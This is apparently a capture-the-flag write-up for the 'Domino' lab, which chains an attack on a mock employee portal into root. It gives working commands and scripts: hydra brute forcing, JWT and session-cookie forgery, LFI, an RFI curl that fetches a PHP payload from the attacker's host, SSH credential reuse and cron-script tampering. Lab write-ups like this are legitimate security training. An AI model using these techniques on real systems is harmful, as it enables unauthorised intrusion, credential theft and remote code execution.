# Domino CTF - Detailed Writeup

## Challenge Overview
The "Domino" challenge involves chaining multiple vulnerabilities in a cascading attack on the NexusCorp Employee Portal. The goal is to progressively escalate access from a regular user to root.

**Target IP:** `10.48.183.83`

---

## Phase 1: Enumeration

### 1.1 Service Scanning
The initial Nmap scan revealed two open ports:
- **Port 22 (SSH):** OpenSSH 9.6p1
- **Port 80 (HTTP):** Apache 2.4.58

```bash
nmap -sC -sV -oA Domino/initial_nmap 10.48.183.83
```

### 1.2 Web Enumeration
The target hosted the "NexusCorp Employee Portal". Key pages identified:
- `/index.php`: Login page.
- `/forgot.php`: Password reset request.
- `/team.php`: Staff directory (leaked usernames/emails).
- `/api/`: API endpoints for users and files.

---

## Phase 2: Initial Access & Flag 1 (IDOR)

### 2.1 Username Gathering
Usernames were extracted from `team.php`:
- `laura.hayes`
- `michael.chen`
- `sarah.johnson`
- `robert.wilson`
- `emma.taylor`
- `david.brown`
- `james.wright`

### 2.2 Brute Forcing Login
Using `hydra`, a brute-force attack was performed on the login page.
```bash
hydra -L users.txt -P passwords.txt 10.48.183.83 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials"
```
**Credentials Found:** `sarah.johnson:password`

### 2.3 Horizontal Privilege Escalation (IDOR)
Upon logging in, a link to `/api/users/profile.php?id=3` was found. Analysis of the source code (`/var/www/html/api/users/profile.php`) confirmed that the application only checked if a user was logged in, but not if they owned the profile being requested.

**Vulnerable Code Snippet:**
```php
$user = require_login();
$id = intval($_GET['id'] ?? 0);
$db = get_db();
$stmt = $db->prepare('SELECT id, username, email, role, notes FROM users WHERE id = ?');
$stmt->execute([$id]);
```

By changing the `id` parameter to `1`, Flag 1 was retrieved from the `notes` field.

**Flag 1:** `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`

---

## Phase 3: Data Leakage & Flag 2 (Admin Panel)

### 3.1 JWT Authentication Bypass
The `/api/files.php` endpoint required an admin JWT. However, `auth.php` revealed that the signature verification was entirely commented out, and the `verify_jwt` function only checked the payload.

**Vulnerable `verify_jwt` in `auth.php`:**
```php
function verify_jwt($token) {
    $parts = explode('.', $token);
    if (count($parts) !== 3) return null;
    $payload = json_decode(base64_decode($parts[1]), true);
    if (!$payload) return null;
    // Signature check intentionally disabled
    // $expected = rtrim(base64_encode(hash_hmac('sha256', "$parts[0].$parts[1]", JWT_SECRET, true)),'=');
    // if (!hash_equals($parts[2], $expected)) return null;
    if (isset($payload['exp']) && $payload['exp'] < time()) return null;
    return $payload;
}
```

This allowed forging an admin token by using the `none` algorithm or any invalid signature.

**JWT Forgery Script (`forge_jwt.py`):**
```python
import base64
import json

header = {"alg":"none","typ":"JWT"}
payload = {"sub":"laura.hayes","role":"admin","iat":1779602495,"exp":1779606095}

def b64url(d):
    return base64.urlsafe_b64encode(json.dumps(d, separators=(",",":")).encode()).decode().rstrip("=")

token = b64url(header) + "." + b64url(payload) + "."
print(token)
```

### 3.2 LFI to Source Code Leakage
Using the forged token, the `/api/files.php` endpoint was accessed. It suffered from Local File Inclusion (LFI), allowing the retrieval of sensitive files.

```bash
curl -H "Authorization: Bearer <FORGED_TOKEN>" "http://10.48.183.83/api/files.php?name=/var/www/html/config.php"
```

**Leaked Secrets from `config.php`:**
- `DB_PASS`: `D3v0ps!2024`
- `APP_SECRET`: `nexus_app_k3y_2024`

### 3.3 Session Cookie Forgery
The `nexus_session` cookie used for the main portal was signed using HMAC-SHA256 with the `APP_SECRET`. 

**Cookie Forgery Script:**
```python
import base64, json, hmac, hashlib
d = {'user_id':1,'username':'laura.hayes','role':'admin'}
b = base64.b64encode(json.dumps(d, separators=(',',':')).encode()).decode()
h = hmac.new(b'nexus_app_k3y_2024', b.encode(), hashlib.sha256).hexdigest()
print(f'{b}.{h}')
```

Accessing `/admin/index.php` with this forged cookie provided Flag 2.

**Flag 2:** `THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}`

---

## Phase 4: Remote Code Execution (RCE) & Flag 3

### 4.1 RFI Exploitation
Analyzing the source of `/api/files.php` revealed an intentional Remote File Inclusion (RFI) vulnerability that used `eval()` on remote content.

**Vulnerable `files.php` logic:**
```php
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    // ...
    ob_start();
    eval(str_replace("<?php", "", $remote));
    $output = ob_get_clean();
    echo json_encode(["output" => $output]);
    exit;
}
```

By hosting a PHP payload, Flag 3 was read from `/opt/flag3.txt`.

**Payload (`exploit.txt`):**
```php
<?php system('cat /opt/flag3.txt'); ?>
```

**Exploit Command:**
```bash
curl -H "Authorization: Bearer <FORGED_TOKEN>" "http://10.48.183.83/api/files.php?name=http://<YOUR_IP>:8001/exploit.txt"
```

**Flag 3:** `THM{rf1_2_rc3_f00th0ld_fl4g3}`

---

## Phase 5: Lateral Movement & Flag 4

The `DB_PASS` found in `config.php` (`D3v0ps!2024`) was reused for the `devops` user account on the system. 

```bash
ssh devops@10.48.183.83 # Password: D3v0ps!2024
cat /home/devops/user.txt
```

**Flag 4:** `THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}`

---

## Phase 6: Privilege Escalation & Flag 5 (Root)

### 6.1 Admin Bot Analysis
The system ran an admin bot (`/opt/admin_bot.py`) as root, which reviewed support tickets and visited URLs within them. While interesting, a more direct path was found.

### 6.2 Writable Cron Job
Enumeration of the `/opt` directory revealed a monitoring script: `/opt/monitoring/health_report.sh`.

**Original `health_report.sh`:**
```bash
#!/bin/bash
LOG_FILE="/var/log/nexus_health.log"
TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
echo "[$TIMESTAMP] Health check started" >> "$LOG_FILE"
systemctl is-active --quiet apache2 && echo "[$TIMESTAMP] Apache: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] Apache: DOWN" >> "$LOG_FILE"
systemctl is-active --quiet mysql && echo "[$TIMESTAMP] MySQL: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] MySQL: DOWN" >> "$LOG_FILE"
DISK=$(df -h / | awk "NR==2{print \$5}")
echo "[$TIMESTAMP] Disk: $DISK" >> "$LOG_FILE"
```

This script was world-writable and executed by `root` via a cron job every minute.

### 6.3 Exploitation
The script was modified to exfiltrate the root flag.

```bash
echo "cat /root/root.txt > /tmp/root_flag.txt" >> /opt/monitoring/health_report.sh
echo "chmod 777 /tmp/root_flag.txt" >> /opt/monitoring/health_report.sh
```

After waiting a minute, Flag 5 was retrieved from `/tmp/root_flag.txt`.

**Flag 5:** `THM{pr1v3sc_cr0n_r00t_fl4g5}`

---

## Conclusion
The challenge demonstrated how minor misconfigurations (IDOR, disabled JWT verification, writable scripts) and common vulnerabilities (LFI/RFI, credential reuse) can be chained to achieve full system compromise.
